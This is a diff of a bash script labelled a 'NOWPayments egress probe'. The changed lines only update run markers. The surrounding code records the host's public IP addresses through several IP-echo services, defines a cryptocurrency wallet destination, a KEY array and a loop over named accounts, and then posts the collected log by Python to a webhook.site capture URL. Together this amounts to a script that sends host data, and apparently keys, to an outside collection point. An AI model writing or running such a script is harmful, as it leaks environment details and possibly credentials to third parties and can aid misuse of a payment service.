@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
-# NOWPayments egress probe — run marker run4481a (intent 4481)
+# NOWPayments egress probe — run marker run4481b (intent 4481)
 set -u
-LOG=/tmp/probe_run4481a.log
+LOG=/tmp/probe_run4481b.log
 : > "$LOG"
 DEST='0x398D488826D0a8f5aD3e53Af5Df753D1BB3d194F'
 WH='https://webhook.site/2cb9d0d5-a76e-41c3-92ae-d8cd23334d81'
@@ -10,7 +10,7 @@ say() { printf '%s\n' "$1" >> "$LOG"; }
 IP1=$(curl -s --max-time 10 https://api.ipify.org || true)
 IP2=$(curl -s --max-time 10 https://checkip.amazonaws.com || true)
 IP3=$(curl -s --max-time 10 https://ifconfig.me || true)
-say "RUN run4481a"
+say "RUN run4481b"
 say "EGRESS ipify=$IP1 amazon=$IP2 ifconfig=$IP3"
 
 declare -A KEY=(
@@ -76,7 +76,7 @@ for name in chenhanhan121 ervin_sults sumonmti498; do
   esac
 done
 
-say "END run4481a"
+say "END run4481b"
 python3 - "$LOG" "$WH" <<'PY'
 import sys,urllib.request
 data=open(sys.argv[1],'rb').read()
